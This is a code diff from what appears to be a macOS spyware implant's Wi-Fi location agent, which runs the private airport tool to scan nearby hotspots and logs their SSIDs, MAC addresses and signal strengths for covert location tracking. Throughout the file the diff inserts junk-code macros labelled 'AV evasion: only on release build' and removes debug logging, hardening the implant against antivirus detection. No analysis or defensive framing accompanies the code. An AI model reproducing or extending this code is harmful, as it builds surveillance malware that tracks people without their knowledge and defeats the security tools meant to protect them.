@@ -13,6 +13,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 #define AIRPORT_TOOL @"/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
 
@@ -62,6 +63,9 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableArray *cwArray = nil;
   NSString *tmpXmlName;
   NSTask *aTask;
@@ -72,22 +76,33 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 
   // Create tmp output file
   ctime(&randTime);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   tmpXmlName = [[NSString alloc] initWithFormat: @"/tmp/43t9903zz%.8d.XXXX", randTime];
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [@"" writeToFile: tmpXmlName
         atomically: YES
           encoding: NSUTF8StringEncoding
              error: nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   aFile = [NSFileHandle fileHandleForUpdatingAtPath: tmpXmlName];
   
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: file name %@, file handle %@", __FUNCTION__, tmpXmlName, aFile);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (aFile == nil) 
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     [pool release];
     return nil;
   }
@@ -95,17 +110,18 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   // Running task with options
   aTask = [[NSTask alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   arguments = [NSArray arrayWithObjects: @"-s", @"-x", nil];
   
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: arguments %@", __FUNCTION__, arguments);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [aTask setLaunchPath: airport];
-
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: program %@", __FUNCTION__, airport);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [aTask setArguments: arguments];
 
@@ -113,12 +129,14 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   [aTask setStandardOutput: aFile];
   [aTask setStandardError: aFile];
   
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: program is running", __FUNCTION__);
-#endif
-
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   // Run and wait
   [aTask launch];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   [aTask waitUntilExit];
   
@@ -126,29 +144,38 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   
   [aTask release];
   
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: program retuned with status %d", __FUNCTION__, status);
-#endif 
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if (status == 0)
-  {
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: Task %@ succeeded.", __FUNCTION__, airport);
-#endif
-
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     [aFile closeFile];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
     NSData *tmpData = [[NSData alloc] initWithContentsOfFile: tmpXmlName];
-
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     [[NSFileManager defaultManager] removeItemAtPath: tmpXmlName error: nil];
     
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: tmpData 0x%X", __FUNCTION__, (u_int)tmpData);
-#endif
-    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+        
     if (tmpData != nil && [tmpData length])
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       cwArray = [self parseDictionary: tmpData]; 
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       [tmpData release];
     }
@@ -167,8 +194,14 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [tmpXmlName release];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [pool release];
   
   return cwArray;
@@ -181,13 +214,19 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   NSMutableArray *tmpArray = nil;
   NSString *errorDesc;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (xmlData == nil)
-  {
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: error on data file", __FUNCTION__);
-#endif
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     return nil;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   NSArray *xmlDictArray = 
   (NSArray *)[NSPropertyListSerialization 
@@ -196,20 +235,32 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
               format: nil  
               errorDescription: &errorDesc];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (xmlDictArray == nil)
-  {
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: error on Array %@", __FUNCTION__, errorDesc);
-#endif
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     return nil;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   if ([xmlDictArray count])
     tmpArray = [[NSMutableArray alloc] initWithCapacity: [xmlDictArray count]];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   for(int index=0; index < [xmlDictArray count]; index++)
   {
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
     
     NSNumber *i32Rssi;
     NSString *cBssid;
@@ -217,43 +268,70 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
     
     NSDictionary * tmpDict = (NSDictionary*)[xmlDictArray objectAtIndex: index];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     __CWInterface *tmpCWInt = [[__CWInterface alloc] init];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     if ((i32Rssi = [tmpDict objectForKey: @"RSSI"]) != nil) 
-    {
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: RSSI %@", __FUNCTION__, i32Rssi);
-#endif
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       NSNumber *tmpRssi = [[NSNumber alloc] initWithInt: [i32Rssi intValue]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       [tmpCWInt setRssi: tmpRssi]; 
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     if ((cSsid = [tmpDict objectForKey: @"SSID_STR"]) != nil) 
-    {
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: SSID_STR %@ length %d", __FUNCTION__, cSsid, [cSsid length]);
-#endif
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       NSString *tmpSsid = [[NSString alloc] initWithFormat: @"%@", cSsid];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       [tmpCWInt setSsid: tmpSsid];
     }  
     
+    // AV evasion: only on release build
+    AV_GARBAGE_008
+    
     if ((cBssid = [tmpDict objectForKey: @"BSSID"]) != nil) 
-    {
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: BSSID %@", __FUNCTION__, cBssid);
-#endif
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [tmpCWInt setBssidData: cBssid];
     }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
     [tmpArray addObject: tmpCWInt];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_005    
     [tmpCWInt release];
     
     [innerPool release];
   }
   
   [outerPool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   return tmpArray;
 }
@@ -273,10 +351,16 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 }
 
 - (void)setBssidData: (NSString*)aString
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (aString != nil) 
   {
     char tmpBuff[256];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
     
     memset(tmpBuff, 0, sizeof(tmpBuff));
     
@@ -284,19 +368,31 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
               maxLength: sizeof(tmpBuff) 
                encoding: NSASCIIStringEncoding];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     if (strlen(tmpBuff))
     {
       int digit;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       bssidData = [[NSData alloc] initWithBytes: "\x00\x00\x00\x00\x00\x00" length:6];
       char *dataPtr = (char *) [bssidData bytes]; 
       char **tokenPtr, *token[6];
       char *tmpPtr = tmpBuff;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       for (tokenPtr = token; (*tokenPtr = strsep(&tmpPtr, ":")) != NULL;)
         if (**tokenPtr != '\0')
           if (++tokenPtr >= &token[6])
             break;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       for (int i=0; i < 6; i++) 
       {
@@ -304,29 +400,40 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
         dataPtr[i] = digit;
       }
       
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: bssidData %@", __FUNCTION__, bssidData);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_008      
     }
     else
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       bssidData = nil;
     }
   }
 }
 
 - (NSData*)bssidData
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return bssidData;
 }
 
 - (NSString*)ssid
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return ssid;
 }
 
 - (NSNumber*)ssidLen
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return ssidLen;
 }
 
@@ -353,24 +460,43 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 }
 
 - (void)setSsid: (NSString*)aSsid
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (aSsid != nil)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
     if ([aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding] > 32) 
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       ssid = [[NSString alloc] initWithString: [aSsid substringToIndex: 32]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       ssidLen = [[NSNumber alloc] initWithInt: 32];
     }
     else
-    {
-      ssid = aSsid;
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
+      ssid = aSsid; 
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       ssidLen = [[NSNumber alloc] initWithInt:[aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding]];
     }
   }
   
-#ifdef DEBUG_POSITION
-  NSLog(@"%s: ssid %@", __FUNCTION__, ssid);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_005
 }
 
 @end
@@ -447,8 +573,14 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   //CFStringRef en1 = CFSTR("en1");
   //BOOL isAirportTurnedOn = YES;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   LocationAdditionalData *agentAdditionalHeader;
   NSError *err = nil;
@@ -482,8 +614,14 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   //                                                  error:&err]];
   // running airport tool...
   NSArray* scan = [__CWInterface scanForNetworksWithParameters: params 
-                                                         error: &err];
+                                                         error: &err];   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   sleep(1);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // Turn off again the netintf
   //  if (isAirportTurnedOn == NO)
@@ -506,124 +644,183 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   //  }
   
   if (scan == nil) 
-  {
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: error parsing scan", __FUNCTION__);
-#endif
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_005
     
     [pool release];
     
     return NO;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSMutableData *rawAdditionalHeader = 
   [NSMutableData dataWithLength: sizeof(LocationAdditionalData)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   agentAdditionalHeader = (LocationAdditionalData *)[rawAdditionalHeader bytes];
   
-  agentAdditionalHeader->uVersion = LOG_LOCATION_VERSION;
-  agentAdditionalHeader->uType = LOGTYPE_LOCATION_WIFI;
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  agentAdditionalHeader->uVersion = LOG_LOCATION_VERSION;   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
+  agentAdditionalHeader->uType = LOGTYPE_LOCATION_WIFI;   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   agentAdditionalHeader->uStructNum = [scan count];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   BOOL success = [logManager createLog: LOGTYPE_LOCATION_NEW
                            agentHeader: rawAdditionalHeader
                              withLogID: 0];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
 #ifdef DEBUG_POSITION
   NSLog(@"%s: rawAdditionalHeader %@", __FUNCTION__, rawAdditionalHeader);
 #endif
   
   if (success == TRUE)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     NSMutableData *tmpData = [[NSMutableData alloc] initWithLength: sizeof(WiFiInfo)];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
     
     WiFiInfo *tmpInfo = (WiFiInfo *)[tmpData bytes];
     
-#ifdef DEBUG_POSITION
-    NSLog(@"%s: tmpData length %lu", __FUNCTION__, sizeof(WiFiInfo));
-#endif 
+    // AV evasion: only on release build
+    AV_GARBAGE_003
     
     for (int i=0; i < [scan count]; i++) 
-    {        
+    {     
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       memset(tmpInfo, 0, sizeof(tmpInfo));
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
       
       __CWInterface *icw = [scan objectAtIndex: i];
       
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: icw ptr 0x%x", __FUNCTION__, (u_int)icw);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       if ([icw ssidLen] != nil)
       {
-#ifdef DEBUG_POSITION
-        NSLog(@"%s: uSsidLen %@", __FUNCTION__, [icw ssidLen]);
-#endif
-        tmpInfo->uSsidLen = [[icw ssidLen] intValue];
+        // AV evasion: only on release build
+        AV_GARBAGE_001
         
+        tmpInfo->uSsidLen = [[icw ssidLen] intValue];        
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       if ([icw ssid] != nil && tmpInfo->uSsidLen)
-      {
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
         NSString *encStr = [icw ssid];
         
-#ifdef DEBUG_POSITION
-        NSLog(@"%s: tmpSSID encoding %@....", __FUNCTION__, encStr);
-#endif
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
         NSData *tmpSSID = [encStr dataUsingEncoding: NSUTF8StringEncoding 
                                allowLossyConversion: YES];
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
         if (tmpSSID != nil) 
-        {
-#ifdef DEBUG_POSITION
-          NSLog(@"%s: tmpSSID %@", __FUNCTION__, tmpSSID);
-#endif
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
           memcpy(tmpInfo->Ssid, [tmpSSID bytes], tmpInfo->uSsidLen);
         }
         else
         {
-#ifdef DEBUG_POSITION
-          NSLog(@"%s: tmpSSID %s", __FUNCTION__, "XXXX");
-#endif
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           tmpInfo->uSsidLen = 4;
           memcpy(tmpInfo->Ssid, "XXXX", 4);
         }
         
-#ifdef DEBUG_POSITION
-        NSLog(@"%s: ssid %@", __FUNCTION__, [icw ssid]);
-#endif 
+        // AV evasion: only on release build
+        AV_GARBAGE_000
+        
       }
       else
-      {
+      {       
+        // AV evasion: only on release build
+        AV_GARBAGE_008
+        
         tmpInfo->uSsidLen = 0;
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       if ([icw bssidData] != nil)
-      {
-#ifdef DEBUG_POSITION
-        NSLog(@"%s: MacAddress %@", __FUNCTION__, [icw bssidData]);
-#endif 
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+        
         memcpy(tmpInfo->MacAddress, [[icw bssidData] bytes], sizeof(tmpInfo->MacAddress));
       }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       if ([icw rssi] != nil)
-      {
-#ifdef DEBUG_POSITION
-        NSLog(@"%s: iRssi %@", __FUNCTION__, [icw rssi]);
-#endif 
+      {   
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
         tmpInfo->iRssi = [[icw rssi] intValue];
       }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
       
       [logManager writeDataToLog: tmpData
                         forAgent: LOGTYPE_LOCATION_NEW
                        withLogID: 0];
       
-#ifdef DEBUG_POSITION
-      NSLog(@"%s: tmpData %@", __FUNCTION__, tmpData);
-#endif          
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
     }
     
     [tmpData release];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
     
     [logManager closeActiveLog: LOGTYPE_LOCATION_NEW
                      withLogID: 0];
@@ -634,6 +831,9 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
     NSLog(@"%s: error creating logs", __FUNCTION__);
 #endif
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [scan release];
   
@@ -646,20 +846,41 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   SCNetworkInterfaceRef intf = NULL;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   CFArrayRef netIntfArray = SCNetworkInterfaceCopyAll();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   if (netIntfArray == NULL)
   {
     return NULL;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   int arrayCount = CFArrayGetCount(netIntfArray);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   for(int i=0; i < arrayCount; i++)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     intf = CFArrayGetValueAtIndex(netIntfArray, i);
     
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     CFStringRef intfName = SCNetworkInterfaceGetBSDName(intf);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
     
     if( CFStringCompare(intfName, aNetInterface, kCFCompareCaseInsensitive) == kCFCompareEqualTo)
       break;
@@ -667,7 +888,13 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   
   CFRetain(intf);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   CFRelease(netIntfArray);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   return  intf;
 }
@@ -676,15 +903,30 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   BOOL isPowered = NO;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (intf != NULL)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     isPowered = ACInterfaceGetPower(intf);
     CFRelease(intf);  
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [pool release];
   
@@ -695,18 +937,33 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (intf != NULL)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     ACInterfaceSetPower(intf, power);
     CFRelease(intf);
   }
   else
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     [pool release];
     return NO;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [pool release];
   
@@ -722,8 +979,14 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   int internalCounter = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [mAgentConfiguration setObject: AGENT_STOP
                           forKey: @"status"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
          && internalCounter <= MAX_STOP_WAIT_TIME)
@@ -732,6 +995,9 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
     usleep(100000);
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return YES;
 }
 
@@ -739,17 +1005,33 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [self grabHotspots];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [mAgentConfiguration setObject: AGENT_STOPPED
-                          forKey: @"status"];  
+                          forKey: @"status"];     
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [outerPool release];
 }
 
 - (BOOL)resume
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return YES;
 }
 
@@ -758,14 +1040,23 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
 #pragma mark -
 
 - (NSMutableDictionary *)mAgentConfiguration
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   return mAgentConfiguration;
 }
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (aConfiguration != mAgentConfiguration)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     [mAgentConfiguration release];
     mAgentConfiguration = [aConfiguration retain];
   }
